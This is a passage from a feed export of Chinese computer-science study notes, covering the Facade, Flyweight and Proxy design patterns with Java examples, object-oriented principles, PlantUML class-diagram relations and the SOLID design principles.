        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"setCD( "</span> <span>+</span> cd <span>+</span> <span>" )"</span><span>)</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>startWatching</span><span>(</span><span>)</span><span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"startWatching()"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Facade</span> <span>{</span>
    <span>private</span> <span>SubSystem</span> subSystem <span>=</span> <span>new</span> <span>SubSystem</span><span>(</span><span>)</span><span>;</span>

    <span>public</span> <span>void</span> <span>watchMovie</span><span>(</span><span>)</span> <span>{</span>
        subSystem<span>.</span><span>turnOnTV</span><span>(</span><span>)</span><span>;</span>
        subSystem<span>.</span><span>setCD</span><span>(</span><span>"a movie"</span><span>)</span><span>;</span>
        subSystem<span>.</span><span>startWatching</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>
    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>Facade</span> facade <span>=</span> <span>new</span> <span>Facade</span><span>(</span><span>)</span><span>;</span>
        facade<span>.</span><span>watchMovie</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><h3 id="设计原则-1" tabindex="-1"> 设计原则</h3>
<p>最少知识原则：只和你的密友谈话。也就是说客户对象所需要交互的对象应当尽可能少。</p>
<h2 id="_6-享元-flyweight" tabindex="-1"> 6. 享元（Flyweight）</h2>
<h3 id="intent-23" tabindex="-1"> Intent</h3>
<p>利用共享的方式来支持大量细粒度的对象，这些对象一部分内部状态是相同的。</p>
<h3 id="class-diagram-23" tabindex="-1"> Class Diagram</h3>
<ul>
<li>Flyweight：享元对象</li>
<li>IntrinsicState：内部状态，享元对象共享内部状态</li>
<li>ExtrinsicState：外部状态，每个享元对象的外部状态不同</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/5f5c22d5-9c0e-49e1-b5b0-6cc7032724d4.png"/> </div><br>
<h3 id="implementation-23" tabindex="-1"> Implementation</h3>
<div><pre><code><span>public</span> <span>interface</span> <span>Flyweight</span> <span>{</span>
    <span>void</span> <span>doOperation</span><span>(</span><span>String</span> extrinsicState<span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>ConcreteFlyweight</span> <span>implements</span> <span>Flyweight</span> <span>{</span>

    <span>private</span> <span>String</span> intrinsicState<span>;</span>

    <span>public</span> <span>ConcreteFlyweight</span><span>(</span><span>String</span> intrinsicState<span>)</span> <span>{</span>
        <span>this</span><span>.</span>intrinsicState <span>=</span> intrinsicState<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>doOperation</span><span>(</span><span>String</span> extrinsicState<span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Object address: "</span> <span>+</span> <span>System</span><span>.</span><span>identityHashCode</span><span>(</span><span>this</span><span>)</span><span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"IntrinsicState: "</span> <span>+</span> intrinsicState<span>)</span><span>;</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"ExtrinsicState: "</span> <span>+</span> extrinsicState<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>FlyweightFactory</span> <span>{</span>

    <span>private</span> <span>HashMap</span><span><span>&lt;</span><span>String</span><span>,</span> <span>Flyweight</span><span>></span></span> flyweights <span>=</span> <span>new</span> <span>HashMap</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>

    <span>Flyweight</span> <span>getFlyweight</span><span>(</span><span>String</span> intrinsicState<span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>!</span>flyweights<span>.</span><span>containsKey</span><span>(</span>intrinsicState<span>)</span><span>)</span> <span>{</span>
            <span>Flyweight</span> flyweight <span>=</span> <span>new</span> <span>ConcreteFlyweight</span><span>(</span>intrinsicState<span>)</span><span>;</span>
            flyweights<span>.</span><span>put</span><span>(</span>intrinsicState<span>,</span> flyweight<span>)</span><span>;</span>
        <span>}</span>
        <span>return</span> flyweights<span>.</span><span>get</span><span>(</span>intrinsicState<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>Client</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>FlyweightFactory</span> factory <span>=</span> <span>new</span> <span>FlyweightFactory</span><span>(</span><span>)</span><span>;</span>
        <span>Flyweight</span> flyweight1 <span>=</span> factory<span>.</span><span>getFlyweight</span><span>(</span><span>"aa"</span><span>)</span><span>;</span>
        <span>Flyweight</span> flyweight2 <span>=</span> factory<span>.</span><span>getFlyweight</span><span>(</span><span>"aa"</span><span>)</span><span>;</span>
        flyweight1<span>.</span><span>doOperation</span><span>(</span><span>"x"</span><span>)</span><span>;</span>
        flyweight2<span>.</span><span>doOperation</span><span>(</span><span>"y"</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><div><pre><code>Object address: 1163157884
IntrinsicState: aa
ExtrinsicState: x
Object address: 1163157884
IntrinsicState: aa
ExtrinsicState: y
</code></pre></div><h3 id="jdk-19" tabindex="-1"> JDK</h3>
<p>Java 利用缓存来加速大量小对象的访问时间。</p>
<ul>
<li>java.lang.Integer#valueOf(int)</li>
<li>java.lang.Boolean#valueOf(boolean)</li>
<li>java.lang.Byte#valueOf(byte)</li>
<li>java.lang.Character#valueOf(char)</li>
</ul>
<h2 id="_7-代理-proxy" tabindex="-1"> 7. 代理（Proxy）</h2>
<h3 id="intent-24" tabindex="-1"> Intent</h3>
<p>控制对其它对象的访问。</p>
<h3 id="class-diagram-24" tabindex="-1"> Class Diagram</h3>
<p>代理有以下四类：</p>
<ul>
<li>远程代理（Remote Proxy）：控制对远程对象（不同地址空间）的访问，它负责将请求及其参数进行编码，并向不同地址空间中的对象发送已经编码的请求。</li>
<li>虚拟代理（Virtual Proxy）：根据需要创建开销很大的对象，它可以缓存实体的附加信息，以便延迟对它的访问，例如在网站加载一个很大图片时，不能马上完成，可以用虚拟代理缓存图片的大小信息，然后生成一张临时图片代替原始图片。</li>
<li>保护代理（Protection Proxy）：按权限控制对象的访问，它负责检查调用者是否具有实现一个请求所必须的访问权限。</li>
<li>智能代理（Smart Reference）：取代了简单的指针，它在访问对象时执行一些附加操作：记录对象的引用次数；当第一次引用一个对象时，将它装入内存；在访问一个实际对象前，检查是否已经锁定了它，以确保其它对象不能改变它。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/9b679ff5-94c6-48a7-b9b7-2ea868e828ed.png"/> </div><br>
<h3 id="implementation-24" tabindex="-1"> Implementation</h3>
<p>以下是一个虚拟代理的实现，模拟了图片延迟加载的情况下使用与图片大小相等的临时内容去替换原始图片，直到图片加载完成才将图片显示出来。</p>
<div><pre><code><span>public</span> <span>interface</span> <span>Image</span> <span>{</span>
    <span>void</span> <span>showImage</span><span>(</span><span>)</span><span>;</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>HighResolutionImage</span> <span>implements</span> <span>Image</span> <span>{</span>

    <span>private</span> <span>URL</span> imageURL<span>;</span>
    <span>private</span> <span>long</span> startTime<span>;</span>
    <span>private</span> <span>int</span> height<span>;</span>
    <span>private</span> <span>int</span> width<span>;</span>

    <span>public</span> <span>int</span> <span>getHeight</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> height<span>;</span>
    <span>}</span>

    <span>public</span> <span>int</span> <span>getWidth</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> width<span>;</span>
    <span>}</span>

    <span>public</span> <span>HighResolutionImage</span><span>(</span><span>URL</span> imageURL<span>)</span> <span>{</span>
        <span>this</span><span>.</span>imageURL <span>=</span> imageURL<span>;</span>
        <span>this</span><span>.</span>startTime <span>=</span> <span>System</span><span>.</span><span>currentTimeMillis</span><span>(</span><span>)</span><span>;</span>
        <span>this</span><span>.</span>width <span>=</span> <span>600</span><span>;</span>
        <span>this</span><span>.</span>height <span>=</span> <span>600</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>boolean</span> <span>isLoad</span><span>(</span><span>)</span> <span>{</span>
        <span>// 模拟图片加载，延迟 3s 加载完成</span>
        <span>long</span> endTime <span>=</span> <span>System</span><span>.</span><span>currentTimeMillis</span><span>(</span><span>)</span><span>;</span>
        <span>return</span> endTime <span>-</span> startTime <span>></span> <span>3000</span><span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>showImage</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Real Image: "</span> <span>+</span> imageURL<span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ImageProxy</span> <span>implements</span> <span>Image</span> <span>{</span>

    <span>private</span> <span>HighResolutionImage</span> highResolutionImage<span>;</span>

    <span>public</span> <span>ImageProxy</span><span>(</span><span>HighResolutionImage</span> highResolutionImage<span>)</span> <span>{</span>
        <span>this</span><span>.</span>highResolutionImage <span>=</span> highResolutionImage<span>;</span>
    <span>}</span>

    <span>@Override</span>
    <span>public</span> <span>void</span> <span>showImage</span><span>(</span><span>)</span> <span>{</span>
        <span>while</span> <span>(</span><span>!</span>highResolutionImage<span>.</span><span>isLoad</span><span>(</span><span>)</span><span>)</span> <span>{</span>
            <span>try</span> <span>{</span>
                <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Temp Image: "</span> <span>+</span> highResolutionImage<span>.</span><span>getWidth</span><span>(</span><span>)</span> <span>+</span> <span>" "</span> <span>+</span> highResolutionImage<span>.</span><span>getHeight</span><span>(</span><span>)</span><span>)</span><span>;</span>
                <span>Thread</span><span>.</span><span>sleep</span><span>(</span><span>100</span><span>)</span><span>;</span>
            <span>}</span> <span>catch</span> <span>(</span><span>InterruptedException</span> e<span>)</span> <span>{</span>
                e<span>.</span><span>printStackTrace</span><span>(</span><span>)</span><span>;</span>
            <span>}</span>
        <span>}</span>
        highResolutionImage<span>.</span><span>showImage</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><div><pre><code><span>public</span> <span>class</span> <span>ImageViewer</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>throws</span> <span>Exception</span> <span>{</span>
        <span>String</span> image <span>=</span> <span>"http://image.jpg"</span><span>;</span>
        <span>URL</span> url <span>=</span> <span>new</span> <span>URL</span><span>(</span>image<span>)</span><span>;</span>
        <span>HighResolutionImage</span> highResolutionImage <span>=</span> <span>new</span> <span>HighResolutionImage</span><span>(</span>url<span>)</span><span>;</span>
        <span>ImageProxy</span> imageProxy <span>=</span> <span>new</span> <span>ImageProxy</span><span>(</span>highResolutionImage<span>)</span><span>;</span>
        imageProxy<span>.</span><span>showImage</span><span>(</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h3 id="jdk-20" tabindex="-1"> JDK</h3>
<ul>
<li>java.lang.reflect.Proxy</li>
<li>RMI</li>
</ul>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>弗里曼. Head First 设计模式 [M]. 中国电力出版社, 2007.</li>
<li>Gamma E. 设计模式: 可复用面向对象软件的基础 [M]. 机械工业出版社, 2007.</li>
<li>Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.</li>
<li><a href="http://www.oodesign.com/" target="_blank" rel="noopener noreferrer">Design Patterns</a></li>
<li><a href="http://java-design-patterns.com/" target="_blank" rel="noopener noreferrer">Design patterns implemented in Java</a></li>
<li><a href="http://www.programering.com/a/MTNxAzMwATY.html" target="_blank" rel="noopener noreferrer">The breakdown of design patterns in JDK</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、三大特性</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/OOP/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E6%80%9D%E6%83%B3.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、三大特性" tabindex="-1"> 一、三大特性</h1>
<h2 id="封装" tabindex="-1"> 封装</h2>
<p>利用抽象数据类型将数据和基于数据的操作封装在一起，使其构成一个不可分割的独立实体。数据被保护在抽象数据类型的内部，尽可能地隐藏内部的细节，只保留一些对外的接口使其与外部发生联系。用户无需关心对象内部的细节，但可以通过对象对外提供的接口来访问该对象。</p>
<p>优点：</p>
<ul>
<li>减少耦合：可以独立地开发、测试、优化、使用、理解和修改</li>
<li>减轻维护的负担：可以更容易被程序员理解，并且在调试的时候可以不影响其他模块</li>
<li>有效地调节性能：可以通过剖析来确定哪些模块影响了系统的性能</li>
<li>提高软件的可重用性</li>
<li>降低了构建大型系统的风险：即使整个系统不可用，但是这些独立的模块却有可能是可用的</li>
</ul>
<p>以下 Person 类封装 name、gender、age 等属性，外界只能通过 get() 方法获取一个 Person 对象的 name 属性和 gender 属性，而无法获取 age 属性，但是 age 属性可以供 work() 方法使用。</p>
<p>注意到 gender 属性使用 int 数据类型进行存储，封装使得用户注意不到这种实现细节。并且在需要修改 gender 属性使用的数据类型时，也可以在不影响客户端代码的情况下进行。</p>
<div><pre><code><span>public</span> <span>class</span> <span>Person</span> <span>{</span>

    <span>private</span> <span>String</span> name<span>;</span>
    <span>private</span> <span>int</span> gender<span>;</span>
    <span>private</span> <span>int</span> age<span>;</span>

    <span>public</span> <span>String</span> <span>getName</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> name<span>;</span>
    <span>}</span>

    <span>public</span> <span>String</span> <span>getGender</span><span>(</span><span>)</span> <span>{</span>
        <span>return</span> gender <span>==</span> <span>0</span> <span>?</span> <span>"man"</span> <span>:</span> <span>"woman"</span><span>;</span>
    <span>}</span>

    <span>public</span> <span>void</span> <span>work</span><span>(</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>18</span> <span>&lt;=</span> age <span>&amp;&amp;</span> age <span>&lt;=</span> <span>50</span><span>)</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>name <span>+</span> <span>" is working very hard!"</span><span>)</span><span>;</span>
        <span>}</span> <span>else</span> <span>{</span>
            <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span>name <span>+</span> <span>" can't work any more!"</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><h2 id="继承" tabindex="-1"> 继承</h2>
<p>继承实现了  <strong>IS-A</strong>  关系，例如 Cat 和 Animal 就是一种 IS-A 关系，因此 Cat 可以继承自 Animal，从而获得 Animal 非 private 的属性和方法。</p>
<p>继承应该遵循里氏替换原则，子类对象必须能够替换掉所有父类对象。</p>
<p>Cat 可以当做 Animal 来使用，也就是说可以使用 Animal 引用 Cat 对象。父类引用指向子类对象称为  <strong>向上转型</strong> 。</p>
<div><pre><code><span>Animal</span> animal <span>=</span> <span>new</span> <span>Cat</span><span>(</span><span>)</span><span>;</span>
</code></pre></div><h2 id="多态" tabindex="-1"> 多态</h2>
<p>多态分为编译时多态和运行时多态：</p>
<ul>
<li>编译时多态主要指方法的重载</li>
<li>运行时多态指程序中定义的对象引用所指向的具体类型在运行期间才确定</li>
</ul>
<p>运行时多态有三个条件：</p>
<ul>
<li>继承</li>
<li>覆盖（重写）</li>
<li>向上转型</li>
</ul>
<p>下面的代码中，乐器类（Instrument）有两个子类：Wind 和 Percussion，它们都覆盖了父类的 play() 方法，并且在 main() 方法中使用父类 Instrument 来引用 Wind 和 Percussion 对象。在 Instrument 引用调用 play() 方法时，会执行实际引用对象所在类的 play() 方法，而不是 Instrument 类的方法。</p>
<div><pre><code><span>public</span> <span>class</span> <span>Instrument</span> <span>{</span>

    <span>public</span> <span>void</span> <span>play</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Instument is playing..."</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Wind</span> <span>extends</span> <span>Instrument</span> <span>{</span>

    <span>public</span> <span>void</span> <span>play</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Wind is playing..."</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Percussion</span> <span>extends</span> <span>Instrument</span> <span>{</span>

    <span>public</span> <span>void</span> <span>play</span><span>(</span><span>)</span> <span>{</span>
        <span>System</span><span>.</span>out<span>.</span><span>println</span><span>(</span><span>"Percussion is playing..."</span><span>)</span><span>;</span>
    <span>}</span>
<span>}</span>
</code></pre></div><div><pre><code><span>public</span> <span>class</span> <span>Music</span> <span>{</span>

    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>
        <span>List</span><span><span>&lt;</span><span>Instrument</span><span>></span></span> instruments <span>=</span> <span>new</span> <span>ArrayList</span><span><span>&lt;</span><span>></span></span><span>(</span><span>)</span><span>;</span>
        instruments<span>.</span><span>add</span><span>(</span><span>new</span> <span>Wind</span><span>(</span><span>)</span><span>)</span><span>;</span>
        instruments<span>.</span><span>add</span><span>(</span><span>new</span> <span>Percussion</span><span>(</span><span>)</span><span>)</span><span>;</span>
        <span>for</span><span>(</span><span>Instrument</span> instrument <span>:</span> instruments<span>)</span> <span>{</span>
            instrument<span>.</span><span>play</span><span>(</span><span>)</span><span>;</span>
        <span>}</span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><div><pre><code>Wind is playing...
Percussion is playing...
</code></pre></div><h1 id="二、类图" tabindex="-1"> 二、类图</h1>
<p>以下类图使用 <a href="https://www.planttext.com/" target="_blank" rel="noopener noreferrer">PlantUML</a> 绘制，更多语法及使用请参考：http://plantuml.com/ 。</p>
<h2 id="泛化关系-generalization" tabindex="-1"> 泛化关系 (Generalization)</h2>
<p>用来描述继承关系，在 Java 中使用 extends 关键字。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/c0874e0a-dba3-467e-9c86-dd9313e0843e.jpg" width="180px"> </div><br>
<div><pre><code>@startuml

title Generalization

class Vihical
class Car
class Trunck

Vihical &lt;|-- Car
Vihical &lt;|-- Trunck

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="实现关系-realization" tabindex="-1"> 实现关系 (Realization)</h2>
<p>用来实现一个接口，在 Java 中使用 implements 关键字。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/83d466bd-946b-4430-854a-cf7b0696d4c8.jpg" width="170px"> </div><br>
<div><pre><code>@startuml

title Realization

interface MoveBehavior
class Fly
class Run

MoveBehavior &lt;|.. Fly
MoveBehavior &lt;|.. Run

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="聚合关系-aggregation" tabindex="-1"> 聚合关系 (Aggregation)</h2>
<p>表示整体由部分组成，但是整体和部分不是强依赖的，整体不存在了部分还是会存在。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a0ce43b7-afa8-4397-a96e-5c12a070f2ae.jpg" width="300px"> </div><br>
<div><pre><code>@startuml

title Aggregation

class Computer
class Keyboard
class Mouse
class Screen

Computer o-- Keyboard
Computer o-- Mouse
Computer o-- Screen

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div><h2 id="组合关系-composition" tabindex="-1"> 组合关系 (Composition)</h2>
<p>和聚合不同，组合中整体和部分是强依赖的，整体不存在了部分也不存在了。比如公司和部门，公司没了部门就不存在了。但是公司和员工就属于聚合关系了，因为公司没了员工还在。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/6a88a398-c494-41f5-bb62-9f7fb811df7c.jpg" width="280px"> </div><br>
<div><pre><code>@startuml

title Composition

class Company
class DepartmentA
class DepartmentB

Company *-- DepartmentA
Company *-- DepartmentB

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><h2 id="关联关系-association" tabindex="-1"> 关联关系 (Association)</h2>
<p>表示不同类对象之间有关联，这是一种静态关系，与运行过程的状态无关，在最开始就可以确定。因此也可以用 1 对 1、多对 1、多对多这种关联关系来表示。比如学生和学校就是一种关联关系，一个学校可以有很多学生，但是一个学生只属于一个学校，因此这是一种多对一的关系，在运行开始之前就可以确定。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/a3e4dc62-0da5-4d22-94f2-140078281812.jpg" width="200px"> </div><br>
<div><pre><code>@startuml

title Association

class School
class Student

School "1" - "n" Student

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="依赖关系-dependency" tabindex="-1"> 依赖关系 (Dependency)</h2>
<p>和关联关系不同的是，依赖关系是在运行过程中起作用的。A 类和 B 类是依赖关系主要有三种形式：</p>
<ul>
<li>A 类是 B 类方法的局部变量；</li>
<li>A 类是 B 类方法当中的一个参数；</li>
<li>A 类向 B 类发送消息，从而影响 B 类发生变化。</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/379444c9-f1d1-45cd-b7aa-b0c18427d388.jpg" width="330px"> </div><br>
<div><pre><code>@startuml

title Dependency

class Vihicle {
    move(MoveBehavior)
}

interface MoveBehavior {
    move()
}

note "MoveBehavior.move()" as N

Vihicle ..> MoveBehavior

Vihicle .. N

@enduml
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><h1 id="三、设计原则" tabindex="-1"> 三、设计原则</h1>
<h2 id="s-o-l-i-d" tabindex="-1"> S.O.L.I.D</h2>
<table>
<thead>
<tr>
<th style="text-align:center">简写</th>
<th style="text-align:center">全拼</th>
<th style="text-align:center">中文翻译</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">SRP</td>
<td style="text-align:center">The Single Responsibility Principle</td>
<td style="text-align:center">单一责任原则</td>
</tr>
<tr>
<td style="text-align:center">OCP</td>
<td style="text-align:center">The Open Closed Principle</td>
<td style="text-align:center">开放封闭原则</td>
</tr>
<tr>
<td style="text-align:center">LSP</td>
<td style="text-align:center">The Liskov Substitution Principle</td>
<td style="text-align:center">里氏替换原则</td>
</tr>
<tr>
<td style="text-align:center">ISP</td>
<td style="text-align:center">The Interface Segregation Principle</td>
<td style="text-align:center">接口分离原则</td>
</tr>
<tr>
<td style="text-align:center">DIP</td>
<td style="text-align:center">The Dependency Inversion Principle</td>
<td style="text-align:center">依赖倒置原则</td>
</tr>
</tbody>
</table>
<h3 id="_1-单一责任原则" tabindex="-1"> 1. 单一责任原则</h3>
<blockquote>
<p>修改一个类的原因应该只有一个。</p>
</blockquote>
<p>换句话说就是让一个类只负责一件事，当这个类需要做过多事情的时候，就需要分解这个类。</p>
<p>如果一个类承担的职责过多，就等于把这些职责耦合在了一起，一个职责的变化可能会削弱这个类完成其它职责的能力。</p>
<h3 id="_2-开放封闭原则" tabindex="-1"> 2. 开放封闭原则</h3>
<blockquote>
<p>类应该对扩展开放，对修改关闭。</p>
</blockquote>
<p>扩展就是添加新功能的意思，因此该原则要求在添加新功能时不需要修改代码。</p>
<p>符合开闭原则最典型的设计模式是装饰者模式，它可以动态地将责任附加到对象上，而不用去修改类的代码。</p>
<h3 id="_3-里氏替换原则" tabindex="-1"> 3. 里氏替换原则</h3>
<blockquote>
<p>子类对象必须能够替换掉所有父类对象。</p>
</blockquote>
<p>继承是一种 IS-A 关系，子类需要能够当成父类来使用，并且需要比父类更特殊。</p>
<p>如果不满足这个原则，那么各个子类的行为上就会有很大差异，增加继承体系的复杂度。</p>
<h3 id="_4-接口分离原则" tabindex="-1"> 4. 接口分离原则</h3>
<blockquote>
<p>不应该强迫客户依赖于它们不用的方法。</p>
</blockquote>
<p>因此使用多个专门的接口比使用单一的总接口要好。</p>
<h3 id="_5-依赖倒置原则" tabindex="-1"> 5. 依赖倒置原则</h3>
<blockquote>
<p>高层模块不应该依赖于低层模块，二者都应该依赖于抽象；抽象不应该依赖于细节，细节应该依赖于抽象。</p>
</blockquote>
<p>高层模块包含一个应用程序中重要的策略选择和业务模块，如果高层模块依赖于低层模块，那么低层模块的改动就会直接影响到高层模块，从而迫使高层模块也需要改动。</p>
<p>依赖于抽象意味着：</p>
<ul>
<li>任何变量都不应该持有一个指向具体类的指针或者引用；</li>
<li>任何类都不应该从具体类派生；</li>
<li>任何方法都不应该覆写它的任何基类中的已经实现的方法。</li>
</ul>
